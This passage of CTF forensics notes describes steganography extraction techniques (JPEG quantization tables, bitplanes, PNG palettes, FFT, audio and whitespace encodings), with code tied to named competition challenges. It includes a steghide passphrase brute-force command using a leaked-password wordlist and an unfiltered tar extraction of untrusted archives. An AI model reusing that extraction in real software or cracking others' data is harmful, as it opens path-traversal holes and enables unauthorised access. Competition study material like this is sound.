qtables = img.quantization

bits = []
for table_id in sorted(qtables.keys()):
    if table_id >= 2:  # Unused tables
        table = qtables[table_id]
        for i in range(64):  # 8x8 = 64 values per DQT
            bits.append(table[i] & 1)  # Extract LSB

# Convert bits to ASCII
flag = ''
for i in range(0, len(bits) - 7, 8):
    byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
    if 32 <= byte <= 126:
        flag += chr(byte)
print(flag)
```

**Manual DQT extraction (when PIL doesn't expose all tables):**
```python
# Parse JPEG manually to find all DQT markers (0xFFDB)
data = open('challenge.jpg', 'rb').read()
pos = 0
while pos < len(data) - 1:
    if data[pos] == 0xFF and data[pos+1] == 0xDB:
        length = int.from_bytes(data[pos+2:pos+4], 'big')
        dqt_data = data[pos+4:pos+2+length]
        table_id = dqt_data[0] & 0x0F
        precision = (dqt_data[0] >> 4) & 0x0F  # 0=8-bit, 1=16-bit
        values = list(dqt_data[1:65]) if precision == 0 else []
        print(f"DQT table {table_id}: {values[:8]}...")
        pos += 2 + length
    else:
        pos += 1
```

**Key insight:** JPEG quantization tables are metadata — they survive recompression and most image processing. Unused table IDs (2-15) can carry arbitrary data without affecting the image.

---

## BMP Bitplane QR Code Extraction + Steghide (BYPASS CTF 2025)

**Pattern (Gold Challenge):** BMP image with QR code hidden in a specific bitplane. Extract the QR code to obtain a steghide password.

**Technique:** Extract individual bitplanes (bits 0-2) for each RGB channel, render as images, scan for QR codes.

```python
from PIL import Image
import numpy as np

img = Image.open('challenge.bmp')
pixels = np.array(img)

# Extract individual bitplanes
for ch_idx, ch_name in enumerate(['R', 'G', 'B']):
    for bit in range(3):  # Check bits 0, 1, 2
        channel = pixels[:, :, ch_idx]
        bit_plane = ((channel >> bit) & 1) * 255
        Image.fromarray(bit_plane.astype(np.uint8)).save(f'bit_{ch_name}_{bit}.png')

# Combined LSB across all channels
lsb_img = np.zeros_like(pixels)
for ch in range(3):
    lsb_img[:, :, ch] = (pixels[:, :, ch] & 1) * 255
Image.fromarray(lsb_img).save('lsb_all.png')
```

**Full attack chain:**
1. Extract bitplanes → find QR code in specific bitplane (often bit 1, not bit 0)
2. Scan QR with `zbarimg bit_G_1.png` → get steghide password
3. `steghide extract -sf challenge.bmp -p <password>` → extract hidden file

**Key insight:** Standard LSB (least significant bit) tools check bit 0 only. Hidden QR codes may be in bit 1 or bit 2 — always check multiple bitplanes systematically. BMP format preserves exact pixel values (no compression artifacts).

---

## Image Jigsaw Puzzle Reassembly via Edge Matching (BYPASS CTF 2025)

**Pattern (Jigsaw Puzzle):** Archive containing multiple puzzle piece images that must be reassembled into the original image. Reassembled image contains the flag (possibly ROT13 encoded).

**Technique:** Compute pixel intensity differences at shared edges between all piece pairs, then greedily place pieces to minimize total edge difference.

```python
from PIL import Image
import numpy as np
import os

# Load all pieces
pieces = {}
for f in sorted(os.listdir('pieces/')):
    pieces[f] = np.array(Image.open(f'pieces/{f}'))

piece_list = list(pieces.keys())
n = len(piece_list)
grid_size = int(n ** 0.5)  # e.g., 25 pieces → 5x5

# Calculate edge compatibility
def edge_diff(img1, img2, direction):
    if direction == 'right':
        return np.sum(np.abs(img1[:, -1].astype(int) - img2[:, 0].astype(int)))
    elif direction == 'bottom':
        return np.sum(np.abs(img1[-1, :].astype(int) - img2[0, :].astype(int)))

# Build compatibility matrices
right_compat = np.full((n, n), float('inf'))
bottom_compat = np.full((n, n), float('inf'))
for i in range(n):
    for j in range(n):
        if i != j:
            right_compat[i, j] = edge_diff(pieces[piece_list[i]], pieces[piece_list[j]], 'right')
            bottom_compat[i, j] = edge_diff(pieces[piece_list[i]], pieces[piece_list[j]], 'bottom')

# Greedy placement
grid = [[None] * grid_size for _ in range(grid_size)]
used = set()
for row in range(grid_size):
    for col in range(grid_size):
        best_piece, best_diff = None, float('inf')
        for idx in range(n):
            if idx in used:
                continue
            diff = 0
            if col > 0:
                diff += right_compat[grid[row][col-1], idx]
            if row > 0:
                diff += bottom_compat[grid[row-1][col], idx]
            if diff < best_diff:
                best_diff, best_piece = diff, idx
        grid[row][col] = best_piece
        used.add(best_piece)

# Reassemble
piece_h, piece_w = pieces[piece_list[0]].shape[:2]
final = Image.new('RGB', (grid_size * piece_w, grid_size * piece_h))
for row in range(grid_size):
    for col in range(grid_size):
        final.paste(Image.open(f'pieces/{piece_list[grid[row][col]]}'),
                     (col * piece_w, row * piece_h))
final.save('reassembled.png')
```

**Post-processing:** Check if reassembled image text is ROT13 encoded. Decode with `tr 'A-Za-z' 'N-ZA-Mn-za-m'`.

**Key insight:** Edge-matching works by minimizing pixel differences at shared borders. The greedy approach (place piece with smallest total edge difference to already-placed neighbors) works well for most CTF puzzles. For harder puzzles, add backtracking.

---

## F5 JPEG DCT Coefficient Ratio Detection (ApoorvCTF 2026)

**Pattern (Engraver's Fault):** Detect F5 steganography in JPEG images by analyzing DCT coefficient distributions. F5 decrements ±1 AC coefficients toward 0, creating a measurable ratio shift.

**Detection metric — ±1/±2 AC coefficient ratio:**
```python
import numpy as np
from PIL import Image
import jpegio  # or use jpeg_toolbox

def f5_ratio(jpeg_path):
    """Ratio below 0.15 indicates F5 modification; above 0.20 indicates clean."""
    jpg = jpegio.read(jpeg_path)
    coeffs = jpg.coef_arrays[0].flatten()  # Luminance Y channel
    coeffs = coeffs[coeffs != 0]  # Remove DC/zeros
    count_1 = np.sum(np.abs(coeffs) == 1)
    count_2 = np.sum(np.abs(coeffs) == 2)
    return count_1 / max(count_2, 1)
```

**Sparse image edge case:** Images with >80% zero DCT coefficients give misleading ±1/±2 ratios. Use a secondary metric:
```python
def f5_sparse_check(jpeg_path):
    """For sparse images, ±2/±3 ratio below 2.5 indicates modification."""
    jpg = jpegio.read(jpeg_path)
    coeffs = jpg.coef_arrays[0].flatten()
    count_2 = np.sum(np.abs(coeffs) == 2)
    count_3 = np.sum(np.abs(coeffs) == 3)
    return count_2 / max(count_3, 1)

# Combined classifier:
r12 = f5_ratio(path)
r23 = f5_sparse_check(path)
is_modified = r12 < 0.15 or (r12 < 0.25 and r23 < 2.5)
```

**Key insight:** F5 steganography shifts ±1 coefficients toward 0, reducing the ±1/±2 ratio. Natural JPEGs have ratio 0.25-0.45; F5-modified drop below 0.10. Sparse images (mostly flat/white) need the secondary ±2/±3 metric because their ±1 counts are inherently low.

---

## PNG Unused Palette Entry Steganography (ApoorvCTF 2026)

**Pattern (The Gotham Files):** Paletted PNG (8-bit indexed color) hides data in palette entries that no pixel references. The image uses indices 0-199 but the PLTE chunk has 256 entries — indices 200-255 contain hidden ASCII in their red channel values.

```python
from PIL import Image
import struct

def extract_unused_plte(png_path):
    img = Image.open(png_path)
    palette = img.getpalette()  # Flat list: [R0,G0,B0, R1,G1,B1, ...]
    pixels = list(img.getdata())
    used_indices = set(pixels)

    # Extract red channel from unused palette entries
    flag = ''
    for i in range(256):
        if i not in used_indices:
            r = palette[i * 3]  # Red channel
            if 32 <= r <= 126:
                flag += chr(r)
    return flag
```

**Key insight:** PNG palette can have up to 256 entries but images typically use fewer. Unused entries are invisible to viewers but persist in the file. Metadata hints like "collector", "the entries that don't make it to the page", or "red light" point to this technique. Always check which palette indices are actually referenced vs. allocated.

---

## QR Code Tile Reconstruction (UTCTF 2026)

**Pattern (QRecreate):** QR code split into tiles/pieces that must be reassembled. Tiles may be scrambled, rotated, or have missing alignment patterns.

**Reconstruction workflow:**
```python
from PIL import Image
import numpy as np

# Load scrambled tiles
tiles = []
for i in range(N_TILES):
    tile = Image.open(f'tile_{i}.png')
    tiles.append(np.array(tile))

# Strategy 1: Edge matching (like jigsaw puzzle)
# Each tile edge has a unique bit pattern — match adjacent edges
def edge_signature(tile, side):
    if side == 'top': return tuple(tile[0, :].flatten())
    if side == 'bottom': return tuple(tile[-1, :].flatten())
    if side == 'left': return tuple(tile[:, 0].flatten())
    if side == 'right': return tuple(tile[:, -1].flatten())

# Strategy 2: QR structure constraints
# - Finder patterns (large squares) MUST be at 3 corners
# - Timing patterns (alternating B/W) run between finders
# - Use these as anchors to orient remaining tiles

# Strategy 3: Brute force small grids
# For 3x3 or 4x4 grids, try all permutations and scan with zbarimg
from itertools import permutations
import subprocess

grid_size = 3
tile_size = tiles[0].shape[0]
for perm in permutations(range(len(tiles))):
    img = Image.new('L', (grid_size * tile_size, grid_size * tile_size))
    for idx, tile_idx in enumerate(perm):
        row, col = divmod(idx, grid_size)
        img.paste(Image.fromarray(tiles[tile_idx]),
                  (col * tile_size, row * tile_size))
    img.save('/tmp/qr_attempt.png')
    result = subprocess.run(['zbarimg', '/tmp/qr_attempt.png'],
                          capture_output=True, text=True)
    if result.stdout.strip():
        print(f"DECODED: {result.stdout}")
        break
```

**Key insight:** QR codes have structural constraints (finder patterns, timing patterns, format info) that drastically reduce the search space. Use QR structure as anchors before brute-forcing tile positions.

---

## Seed-Based Pixel Permutation + Multi-Bitplane QR (L3m0nCTF 2025)

**Pattern (Lost Signal):** Image with randomized pixel colors hides a QR code. Pixels are visited in a seed-determined permutation order, and data is interleaved across multiple bitplanes of the luminance (Y) channel.

**Extraction workflow:**
1. Convert image to YCbCr and extract Y (luminance) channel
2. Generate the pixel visit order using the known seed
3. Extract LSB bits from multiple bitplanes in interleaved order
4. Reconstruct as a binary image and scan as QR code

```python
from PIL import Image
import numpy as np

SEED = 739391  # Given or brute-forced

# 1. Extract Y channel
img = Image.open("challenge.png").convert("YCbCr")
Y = np.array(img.split()[0], dtype=np.uint8)
h, w = Y.shape

# 2. Generate deterministic pixel permutation
rng = np.random.RandomState(SEED)
perm = np.arange(h * w)
rng.shuffle(perm)

# 3. Extract bits from multiple bitplanes (interleaved)
bitplanes = [0, 1]  # LSB0 and LSB1
total_bits = h * w
bits = np.zeros(total_bits, dtype=np.uint8)

for i in range(total_bits):
    pix_idx = perm[i // len(bitplanes)]
    bp = bitplanes[i % len(bitplanes)]
    y, x = divmod(pix_idx, w)
    bits[i] = (Y[y, x] >> bp) & 1

# 4. Reconstruct QR code
qr = bits.reshape((h, w))
qr_img = Image.fromarray((255 * (1 - qr)).astype(np.uint8))
qr_img.save("recovered_qr.png")
# zbarimg recovered_qr.png
```

**Key insight:** The seed defines a deterministic pixel visit order (Fisher-Yates shuffle via `RandomState`). Without the correct seed, output is random noise. Bits from different bitplanes are interleaved (bit 0 from pixel N, bit 1 from pixel N, bit 0 from pixel N+1, ...), doubling the data density. Try the Y (luminance) channel first — it has the highest contrast for hidden binary data.

**Seed recovery:** If the seed is unknown, look for it in: EXIF metadata, filename, image dimensions, challenge description numbers, or brute-force small ranges.

**Detection:** Image appears as random colored noise but has suspicious dimensions (perfect square, power of 2). Challenge mentions "seed", "random", or "signal".

---




---

<!-- Source: steganography.md -->

# CTF Forensics - Steganography

## Table of Contents
- [Quick Tools](#quick-tools)
- [Binary Border Steganography](#binary-border-steganography)
- [JPEG Thumbnail Pixel-to-Text Mapping (RuCTF 2013)](#jpeg-thumbnail-pixel-to-text-mapping-ructf-2013)
- [Conditional LSB Extraction — Near-Black Pixel Filter (BaltCTF 2013)](#conditional-lsb-extraction--near-black-pixel-filter-baltctf-2013)
- [GIF Frame Differential + Morse Code (BaltCTF 2013)](#gif-frame-differential--morse-code-baltctf-2013)
- [GZSteg + Spammimic Text Steganography (VolgaCTF 2013)](#gzsteg--spammimic-text-steganography-volgactf-2013)

For 2024-2026 era techniques (PDF, PNG chunks, JPEG quantization, F5, jigsaw, QR tiles), see [steganography-2.md](steganography-2.md).

---

## Quick Tools

```bash
steghide extract -sf image.jpg
zsteg image.png              # PNG/BMP analysis
stegsolve                    # Visual analysis

# Steghide brute-force (0xFun 2026)
stegseek image.jpg rockyou.txt  # Faster than stegcracker
# Common weak passphrases: "simple", "password", "123456"
```

---

## Binary Border Steganography

**Pattern (Framer, PascalCTF 2026):** Message encoded as black/white pixels in 1-pixel border around image.

```python
from PIL import Image

img = Image.open('output.jpg')
w, h = img.size
bits = []

# Read border clockwise: top → right → bottom (reversed) → left (reversed)
for x in range(w): bits.append(0 if sum(img.getpixel((x, 0))[:3]) < 384 else 1)
for y in range(1, h): bits.append(0 if sum(img.getpixel((w-1, y))[:3]) < 384 else 1)
for x in range(w-2, -1, -1): bits.append(0 if sum(img.getpixel((x, h-1))[:3]) < 384 else 1)
for y in range(h-2, 0, -1): bits.append(0 if sum(img.getpixel((0, y))[:3]) < 384 else 1)

# Convert bits to ASCII
msg = ''.join(chr(int(''.join(map(str, bits[i:i+8])), 2)) for i in range(0, len(bits)-7, 8))
```

---

## JPEG Thumbnail Pixel-to-Text Mapping (RuCTF 2013)

**Pattern:** JPEG contains an embedded thumbnail where dark pixels map 1:1 to character positions in visible text on the main image.

```python
from PIL import Image
# Extract thumbnail: exiftool -b -ThumbnailImage secret.jpg > thumb.jpg
thumb = Image.open('thumb.jpg')
text_lines = ["line1 of visible text...", "line2..."]  # OCR or type from photo
result = ''
for y in range(thumb.height):
    for x in range(thumb.width):
        r, g, b = thumb.getpixel((x, y))[:3]
        if r < 100 and g < 100 and b < 100:  # Dark pixel = selected char
            result += text_lines[y][x]
```

**Key insight:** Extract thumbnails with `exiftool -b -ThumbnailImage`. Dark pixels act as a selection mask over the photographed text. Use OCR (ABBYY FineReader, Tesseract) to get the text grid, then map dark thumbnail pixels to character positions.

---

## Conditional LSB Extraction — Near-Black Pixel Filter (BaltCTF 2013)

**Pattern:** Only pixels with R<=1 AND G<=1 AND B<=1 carry steganographic data. Standard LSB tools miss the data because they process all pixels.

```python
from PIL import Image
img = Image.open('image.png')
bits = ''
for pixel in img.getdata():
    r, g, b = pixel[0], pixel[1], pixel[2]
    if not (r <= 1 and g <= 1 and b <= 1):
        continue  # Skip non-carrier pixels
    bits += str(r & 1) + str(g & 1) + str(b & 1)
# Convert bits to bytes
flag = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits)-7, 8))
```

**Key insight:** When standard `zsteg`/`stegsolve` find nothing, try filtering pixels by value range before LSB extraction. The carrier pixels may be restricted to near-black, near-white, or specific color ranges.

---

## GIF Frame Differential + Morse Code (BaltCTF 2013)

**Pattern:** Animated GIF contains hidden dots visible only when comparing frames against originals. Dots encode Morse code.

```bash
# Extract frames from animated GIF
convert animated.gif frame_%03d.gif

# Compare each frame against its base using ImageMagick
for i in $(seq 1 100); do
    compare -fuzz 10% -compose src stego_$i.gif original_$i.gif diff_$i.gif
done

# Inspect diff images — dots appear at specific positions
# Map dot patterns to Morse: small dot = dit, large dot = dah
```

**Key insight:** `compare -fuzz 10%` reveals subtle single-pixel modifications invisible to the eye. The diff images show isolated dots whose timing/spacing encodes Morse code. Decode dots → dashes/dots → letters → flag.

---

## GZSteg + Spammimic Text Steganography (VolgaCTF 2013)

**Pattern:** Data hidden within gzip compression metadata, decoded through spammimic.com.

1. Apply GZSteg patches to gzip 1.2.4 source, compile, extract with `gzip --s` flag
2. Extracted text resembles spam email — submit to [spammimic.com](https://www.spammimic.com/) decoder
3. Decoded output is the flag

**Key insight:** GZSteg exploits redundancy in the gzip DEFLATE compression format to embed covert data. The extracted payload often uses a second steganographic layer (spammimic encodes data as innocuous-looking spam text). Look for `.gz` files larger than expected for their content.



---

<!-- Source: stego-advanced.md -->

# CTF Forensics - Advanced Steganography

## Table of Contents
- [FFT Frequency Domain Steganography (Pragyan 2026)](#fft-frequency-domain-steganography-pragyan-2026)
- [SSTV Red Herring + LSB Audio Stego (0xFun 2026)](#sstv-red-herring--lsb-audio-stego-0xfun-2026)
- [DotCode Barcode via SSTV (0xFun 2026)](#dotcode-barcode-via-sstv-0xfun-2026)
- [DTMF Audio Decoding](#dtmf-audio-decoding)
- [Custom Frequency DTMF / Dual-Tone Keypad Encoding (EHAX 2026)](#custom-frequency-dtmf--dual-tone-keypad-encoding-ehax-2026)
- [Multi-Track Audio Differential Subtraction (EHAX 2026)](#multi-track-audio-differential-subtraction-ehax-2026)
- [Cross-Channel Multi-Bit LSB Steganography (ApoorvCTF 2026)](#cross-channel-multi-bit-lsb-steganography-apoorvctf-2026)
- [Audio FFT Musical Note Identification (BYPASS CTF 2025)](#audio-fft-musical-note-identification-bypass-ctf-2025)
- [Audio Metadata Octal Encoding (BYPASS CTF 2025)](#audio-metadata-octal-encoding-bypass-ctf-2025)
- [Nested Tar Archive with Whitespace Encoding (UTCTF 2026)](#nested-tar-archive-with-whitespace-encoding-utctf-2026)
- [Audio Waveform Binary Encoding (BackdoorCTF 2013)](#audio-waveform-binary-encoding-backdoorctf-2013)
- [Audio Spectrogram Hidden QR Code (BaltCTF 2013)](#audio-spectrogram-hidden-qr-code-baltctf-2013)
- [Video Frame Accumulation for Hidden Image (ASIS CTF Finals 2013)](#video-frame-accumulation-for-hidden-image-asis-ctf-finals-2013)
- [Reversed Audio Hidden Message (ASIS CTF Finals 2013)](#reversed-audio-hidden-message-asis-ctf-finals-2013)

---

## FFT Frequency Domain Steganography (Pragyan 2026)

**Pattern (H@rDl4u6H):** Image encodes data in frequency domain via 2D FFT.

**Decoding workflow:**
```python
import numpy as np
from PIL import Image

img = np.array(Image.open("image.png")).astype(float)
F = np.fft.fftshift(np.fft.fft2(img))
mag = np.log(1 + np.abs(F))

# Look for patterns: concentric rings, dots at specific positions
# Bright peak = 0 bit, Dark (no peak) = 1 bit
cy, cx = mag.shape[0]//2, mag.shape[1]//2
radii = [100 + 69*i for i in range(21)]  # Example spacing
angles = [0, 22.5, 45, 67.5, 90, 112.5, 135, 157.5]
THRESHOLD = 13.0

bits = []
for r in radii:
    byte_val = 0
    for a in angles:
        fx = cx + r * np.cos(np.radians(a))
        fy = cy - r * np.sin(np.radians(a))
        bit = 0 if mag[int(round(fy)), int(round(fx))] > THRESHOLD else 1
        byte_val = (byte_val << 1) | bit
    bits.append(byte_val)
```

**Identification:** Challenge mentions "transform", poem about "frequency", or image looks blank/noisy. Try FFT visualization first.

---

## SSTV Red Herring + LSB Audio Stego (0xFun 2026)

**Pattern (Melodie):** WAV contains SSTV signal (Scottie 1) that decodes to "SEEMS LIKE A DEADEND". Real flag in 2-bit LSB of audio samples.

```bash
# Decode SSTV (red herring)
qsstv  # Will show decoy message

# Extract real flag from LSB
pip install stego-lsb
stegolsb wavsteg -r -i audio.wav -o out.bin -n 2 -b 1000
```

**Lesson:** Obvious signals may be decoys. Always check LSB even when another encoding is found.

---

## DotCode Barcode via SSTV (0xFun 2026)

**Pattern (Dots):** SSTV decoding produces dot pattern image. Not QR — it's DotCode format.

**Identification:** Dot pattern that isn't a standard QR code. DotCode is a 2D barcode optimized for high-speed printing.

**Tool:** Aspose online DotCode reader (free).

---

## DTMF Audio Decoding

**Pattern (Phone Home):** Audio file contains phone dialing tones encoding data.

```bash
# Decode DTMF tones
sox phonehome.wav -t raw -r 22050 -e signed-integer -b 16 -c 1 - | \
    multimon-ng -t raw -a DTMF -
```

**Post-processing:** Phone number may contain octal-encoded ASCII after delimiter (#):
```python
# Convert octal groups to ASCII
octal_groups = ["115", "145", "164", "141"]  # M, e, t, a
flag = ''.join(chr(int(g, 8)) for g in octal_groups)
```

---

## Custom Frequency DTMF / Dual-Tone Keypad Encoding (EHAX 2026)

**Pattern (Quantum Message):** Audio with dual-tone sequences at non-standard frequencies, aligned at regular intervals (e.g., every 1 second). Hints about "harmonic oscillators" or physics point to custom frequency design.

**Identification:** Spectrogram shows two distinct frequency sets that don't match standard DTMF (697-1633 Hz). Look for evenly-spaced rows/columns of frequency tones.

**Decoding workflow:**
```python
import numpy as np
from scipy.io import wavfile

rate, audio = wavfile.read('challenge.wav')

# 1. Generate spectrogram to identify frequency grid
# Use ffmpeg: ffmpeg -i challenge.wav -lavfi showspectrumpic=s=1920x1080 spec.png

# 2. Map frequencies to keypad (custom grid, NOT standard DTMF)
# Example: rows = [301, 902, 1503, 2104] Hz, cols = [2705, 3306, 3907] Hz
# Forms 4x3 keypad -> digits 0-9 + symbols

# 3. Extract tone pairs per time window
window_size = rate  # 1 second per symbol
for i in range(0, len(audio), window_size):
    segment = audio[i:i+window_size]
    freqs = np.fft.rfftfreq(len(segment), 1/rate)
    magnitude = np.abs(np.fft.rfft(segment))
    # Find two dominant peaks -> map to row/col -> digit

# 4. Convert digit sequence to ASCII
# Split digits into variable-length groups (ASCII range 32-126)
# E.g., "72101108108111" -> [72, 101, 108, 108, 111] -> "Hello"
def digits_to_ascii(digits):
    result, i = [], 0
    while i < len(digits):
        for length in [2, 3]:  # ASCII codes are 2-3 digits
            if i + length <= len(digits):
                val = int(digits[i:i+length])
                if 32 <= val <= 126:
                    result.append(chr(val))
                    i += length
                    break
        else:
            i += 1
    return ''.join(result)
```

**Key insight:** When tones don't match standard DTMF frequencies, generate a spectrogram first to identify the custom frequency grid. The mapping is challenge-specific.

---

## Multi-Track Audio Differential Subtraction (EHAX 2026)

**Pattern (Penguin):** MKV/video file with two nearly-identical audio tracks. Hidden data is embedded as a tiny difference between the tracks, invisible when listening to either individually.

**Identification:**
- `ffprobe` reveals multiple audio streams (e.g., two stereo FLAC tracks)
- Metadata may contain a decoy flag (e.g., in comments)
- Track labels may be misleading (e.g., stereo labeled as "5.1 surround")
- `sox --info` / `sox -n stat` shows nearly identical RMS, amplitude, and frequency statistics for both tracks

**Extraction workflow:**
```bash
# 1. Extract both audio tracks
ffmpeg -i challenge.mkv -map 0:a:0 -c copy track0.flac
ffmpeg -i challenge.mkv -map 0:a:1 -c copy track1.flac

# 2. Convert to WAV for processing
ffmpeg -i track0.flac track0.wav
ffmpeg -i track1.flac track1.wav

# 3. Subtract: invert one track and mix (cancels shared content)
sox -m track0.wav "|sox track1.wav -p vol -1" diff.wav

# 4. Normalize the difference signal
sox diff.wav diff_norm.wav gain -n -3

# 5. Generate spectrogram to read the flag
sox diff_norm.wav -n spectrogram -o spectrogram.png -X 2000 -Y 1000 -z 100 -h

# 6. Optional: filter to isolate flag frequency range
sox diff_norm.wav filtered.wav sinc 5000-12000
sox filtered.wav -n spectrogram -o filtered_spec.png -X 2000 -Y 1000 -z 100 -h
```

**Key insight:** When two audio tracks are nearly identical, subtracting one from the other (phase inversion + mix) cancels shared content and isolates hidden data. The flag is typically encoded as text in the spectrogram of the difference signal, visible in a specific frequency band (e.g., 5-12 kHz).

**Common traps:**
- Decoy flags in metadata/comments — always verify
- Mislabeled channel configurations (stereo as 5.1)
- Flag may only be visible in a narrow time window — use high-resolution spectrogram (`-X 2000+`)

---

## Cross-Channel Multi-Bit LSB Steganography (ApoorvCTF 2026)

**Pattern (Beneath the Armor):** Standard LSB tools (zsteg, stegsolve) fail because different bit positions are used per RGB channel: Red channel bit 0, Green channel bit 1, Blue channel bit 2.

```python
from PIL import Image

img = Image.open("challenge.png")
pixels = img.load()
bits = []
for y in range(img.height):
    for x in range(img.width):
        r, g, b = pixels[x, y][:3]
        bits.append((r >> 0) & 1)  # Red: bit 0
        bits.append((g >> 1) & 1)  # Green: bit 1
        bits.append((b >> 2) & 1)  # Blue: bit 2

# Pack 3 bits per pixel into bytes
data = bytearray()
for i in range(0, len(bits) - 7, 8):
    byte = 0
    for j in range(8):
        byte = (byte << 1) | bits[i + j]
    data.append(byte)
print(data.decode('ascii', errors='ignore'))
```

**Key insight:** When standard LSB tools find nothing, the data may use different bit positions per channel. The hint "cycles" or "modular" suggests cycling through bit positions (0→1→2) across channels. Always try non-standard bit combinations: R[0]G[1]B[2], R[1]G[2]B[0], R[2]G[0]B[1], etc.

**Detection:** Standard `zsteg -a` and `stegsolve` produce no results on an image that metadata hints contain hidden data.

---

## Audio FFT Musical Note Identification (BYPASS CTF 2025)

**Pattern (Piano):** Identify dominant frequencies via FFT (Fast Fourier Transform), map to musical notes (A-G), then read the letter names as a word.

**Technique:** Perform FFT on audio, identify dominant frequencies, map to musical notes.

```python
import numpy as np
from scipy.io import wavfile

rate, audio = wavfile.read('challenge.wav')
if audio.ndim > 1:
    audio = audio[:, 0]  # mono

# FFT to find dominant frequencies
freqs = np.fft.rfftfreq(len(audio), 1/rate)
magnitude = np.abs(np.fft.rfft(audio))

# Find top peaks
peak_indices = np.argsort(magnitude)[-20:]
peak_freqs = sorted(set(round(freqs[i]) for i in peak_indices if freqs[i] > 20))

# Musical note frequency mapping (A4 = 440 Hz)
NOTE_FREQS = {
    'C4': 261.63, 'D4': 293.66, 'E4': 329.63, 'F4': 349.23,
    'G4': 392.00, 'A4': 440.00, 'B4': 493.88,
    'C5': 523.25, 'D5': 587.33, 'E5': 659.25, 'F5': 698.46,
    'G5': 783.99, 'A5': 880.00, 'B5': 987.77,
}

def freq_to_note(freq):
    return min(NOTE_FREQS.items(), key=lambda x: abs(x[1] - freq))[0]

notes = [freq_to_note(f) for f in peak_freqs]
# Extract letter names: B, A, D, F, A, C, E → "BADFACE"
answer = ''.join(n[0] for n in notes)
print(f"Notes: {notes}")
print(f"Answer: {answer}")
```

**Extract and examine audio metadata** using `exiftool audio.mp3` for encoded hints in comment fields (e.g., octal-separated values → base64 → decoded hint).

**Key insight:** Musical note names (A-G) can spell words. When a challenge involves music/piano, identify dominant frequencies via FFT and read the note letter names as text.

---

## Audio Metadata Octal Encoding (BYPASS CTF 2025)

**Pattern (Piano metadata):** Audio file metadata (exiftool comment field) contains underscore-separated numbers representing octal-encoded ASCII values (digits 0-7 only).

```python
# Extract and decode octal metadata
import subprocess, base64

# Get metadata comment
comment = "103_137_63_157_144_145_144_40_162_145_154_151_143"
octal_values = comment.split('_')
decoded = ''.join(chr(int(v, 8)) for v in octal_values)

# May decode to base64, requiring another layer
result = base64.b64decode(decoded).decode()
print(result)
```

**Key insight:** When metadata contains underscore-separated numbers, try octal (digits 0-7 only), decimal, or hex interpretation. Multi-layer encoding (octal → base64 → plaintext) is common.

---

## Nested Tar Archive with Whitespace Encoding (UTCTF 2026)

**Pattern (Silent Archive):** Deeply nested tar archives where data is encoded in whitespace characters (spaces, tabs, newlines) within file names or content.

**Detection:** Archive extracts to another archive (tar-in-tar chain). File content appears empty but contains invisible whitespace characters.

**Decoding workflow:**
```python
import tarfile
import os

# 1. Recursively extract nested tar archives
def extract_all(path, depth=0):
    if depth > 100:  # Guard against infinite nesting
        return
    if tarfile.is_tarfile(path):
        with tarfile.open(path) as tf:
            tf.extractall(f'layer_{depth}')
            for member in tf.getmembers():
                extract_all(f'layer_{depth}/{member.name}', depth + 1)

# 2. Collect whitespace from file names or content
whitespace_data = []
for root, dirs, files in os.walk('layer_0'):
    for f in files:
        path = os.path.join(root, f)
        with open(path, 'rb') as fh:
            content = fh.read()
            # Check for whitespace-only content
            if content.strip() == b'':
                for byte in content:
                    if byte == 0x20:  # space
                        whitespace_data.append('0')
                    elif byte == 0x09:  # tab
                        whitespace_data.append('1')

# 3. Convert binary from whitespace
bits = ''.join(whitespace_data)
message = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits)-7, 8))
print(message.decode(errors='replace'))
```

**Whitespace encoding variants:**
- Space = 0, Tab = 1 (binary encoding)
- Whitespace Steganography: trailing spaces/tabs at end of lines
- Zero-width characters (U+200B, U+200C, U+FEFF) in Unicode text
- Number of spaces between words encodes data

**Key insight:** "Silent" or "invisible" hints point to whitespace encoding. Use `xxd` or `cat -A` to reveal hidden whitespace characters. Deeply nested archives are misdirection — the data is in the whitespace, not the nesting depth.

---

## Audio Waveform Binary Encoding (BackdoorCTF 2013)

**Pattern:** WAV file contains two distinct waveform shapes representing binary 0 and 1. Group 8 bits into bytes and decode as ASCII.

```python
import wave, struct
wf = wave.open('audio.wav', 'rb')
frames = wf.readframes(wf.getnframes())
samples = struct.unpack(f'{len(frames)//2}h', frames)

# Identify two distinct wave patterns (e.g., positive peak vs flat)
# Segment audio into fixed-length windows, classify each as 0 or 1
bits = ''
window = len(samples) // num_bits
for i in range(num_bits):
    segment = samples[i*window:(i+1)*window]
    bits += '1' if max(segment) > threshold else '0'

# Decode binary to ASCII
flag = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits)-7, 8))
```

**Key insight:** Open in Audacity and zoom in — two visually distinct wave patterns alternate. Each pattern represents one bit. Count the patterns, group into 8-bit bytes, decode as ASCII.

---

## Audio Spectrogram Hidden QR Code (BaltCTF 2013)

**Pattern:** Audio file contains visual data hidden in the frequency domain, visible only in a spectrogram view.

```bash
# Generate spectrogram image
sox audio.mp3 -n spectrogram -o spec.png
# Or use Sonic Visualiser for interactive exploration

# Look for visual patterns in specific frequency bands (often 5-12 kHz)
# Extract/assemble QR code fragments from spectrogram
# Scan with: zbarimg assembled_qr.png
```

**Key insight:** Use Sonic Visualiser (Layer → Add Spectrogram) with adjustable window size and color mapping. QR codes or text often appear in the 2-15 kHz band. Multiple spectrogram fragments may need to be stitched together in an image editor before scanning.

---

## Video Frame Accumulation for Hidden Image (ASIS CTF Finals 2013)

**Pattern:** Video shows small images (icons, shapes) flashing briefly at different screen positions. Individual frames appear random, but the positions trace out a hidden pattern (QR code, text, image) when all frames are composited together.

**Extraction workflow:**

1. Extract individual frames from the video:
```bash
ffmpeg -i challenge.mp4 -vsync 0 frames/frame_%04d.png
```

2. Composite all frames by taking the maximum (or union) of all pixel values:
```python
from PIL import Image
import os

frames_dir = 'frames'
frame_files = sorted(os.listdir(frames_dir))

# Load first frame as base
base = Image.open(os.path.join(frames_dir, frame_files[0])).convert('L')

# Accumulate: take maximum pixel value across all frames
import numpy as np
accumulated = np.array(base, dtype=np.float64)
for f in frame_files[1:]:
    frame = np.array(Image.open(os.path.join(frames_dir, f)).convert('L'), dtype=np.float64)
    accumulated = np.maximum(accumulated, frame)

result = Image.fromarray(accumulated.astype(np.uint8))
result.save('accumulated.png')
```

3. Alternative: convert to GIF and delete the black background frame in GIMP to see all positions overlaid.

4. Clean up the revealed pattern (e.g., QR code) — select foreground, grow/shrink selection, flood fill, scale to expected dimensions (e.g., 21x21 for Version 1 QR):
```bash
# Scan for QR code
